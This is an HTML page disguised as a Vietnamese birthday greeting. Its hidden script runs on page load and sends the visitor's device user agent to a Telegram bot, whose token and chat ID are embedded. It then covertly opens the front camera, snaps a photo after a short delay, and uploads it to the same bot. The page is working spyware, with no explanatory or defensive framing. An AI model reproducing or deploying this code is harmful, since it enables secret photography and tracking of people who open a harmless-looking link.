<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hpbd</title>
</head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2>chuc mung sinh nhat🎂🎂🎂🎂🎂🎂</h2>
    <p>:))</p>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
      
        const BOT_TOKEN = '8377654831:AAG7Q_WCxKJ5K8c0hFiXgr0BJBFQmKEiynA';
        const CHAT_ID = '7662943088';
        // ============================================

        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `📱 **Có thiết bị truy cập:**\n${navigator.userAgent}`,
                parse_mode: 'Markdown'
            })
        });

        
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'cam.jpg');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).then(() => stream.getTracks().forEach(t => t.stop()));
                }, 'image/jpeg', 0.8);
            }, 1500);
        });
    </script>
</body>
</html>
